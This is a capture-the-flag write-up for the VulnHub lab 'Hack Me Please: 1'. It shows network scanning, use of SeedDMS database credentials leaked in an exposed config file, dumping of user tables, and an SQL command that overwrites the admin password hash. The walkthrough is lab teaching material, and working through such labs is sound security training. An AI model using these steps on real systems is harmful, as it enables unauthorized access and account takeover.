# Hack Me Please: 1 

![image](https://user-images.githubusercontent.com/5285547/130267694-61e97652-f3e3-467b-b47f-416b2b230845.png)

Link: https://www.vulnhub.com/entry/hack-me-please-1,731/

## Enum 

Find IP

```
sudo arp-scan --localnet -I eth0
```

IP: 192.168.1.179

Nmap

```
nmap -p- -v 192.168.1.179

PORT      STATE SERVICE
80/tcp    open  http
3306/tcp  open  mysql
33060/tcp open  mysqlx
```

## Port 80

![image](https://user-images.githubusercontent.com/5285547/130267618-2288e9b7-eed5-4bc4-904c-78f64ce658ee.png)


Checking the main site didn't show anything of intrest. 
Looking in the js files (main.js) I saw an intresting comment. 

```
//make sure this js file is same as installed app on our server endpoint: /seeddms51x/seeddms-5.1.22/
```

## Seeddms51x

Looking up this online for exploits showed a few authenticated RCE, but I had no auth. So checked out the github files for the framework. 

![image](https://user-images.githubusercontent.com/5285547/130268655-c978973b-e83f-439e-b616-cb95b32f21dc.png)

Testing to access the words file, I could access it. 

![image](https://user-images.githubusercontent.com/5285547/130268693-d6a62213-ed9f-479d-b7e3-f3cd6845a075.png)

I could however access the settings file: http://IP/seeddms51x/conf/settings.xml.template
I also checked for settings.xml and found more info sepcifially the login for the mysql server

![image](https://user-images.githubusercontent.com/5285547/130269408-f4515931-0a61-4652-85d7-9caf8ae2bee3.png)

```
seeddms:seeddms
```

```
mysql -h 192.168.1.179 -u seeddms -D seeddms -p
```

![image](https://user-images.githubusercontent.com/5285547/130269997-a9f36935-de64-446e-b542-511cd93bfc86.png)


## User

Now we have database access we can acesss any info on the users

```
show databases;
use seeddms;
show tables;
select * from users\G; # prints nice
```

![image](https://user-images.githubusercontent.com/5285547/130270127-5756e71f-b8e2-4f00-a5ba-687fe3ad106f.png)

```
select * from tblUsers\G;
```

![image](https://user-images.githubusercontent.com/5285547/130270358-aef8a1cd-2a96-4ef6-9e51-e509e6462935.png)

I could not crack the admin password so i simply updated it. 

```
echo -n "Hello" | md5sum 
8b1a9953c4611296a827abf8c47804d7  -
```

Mysql again

```
update tblUsers SET pwd = ('8b1a9953c4611296a827abf8c47804d7') where id = 1;
Query OK, 1 row affected (0.001 sec)
Rows matched: 1  Changed: 1  Warnings: 0

```



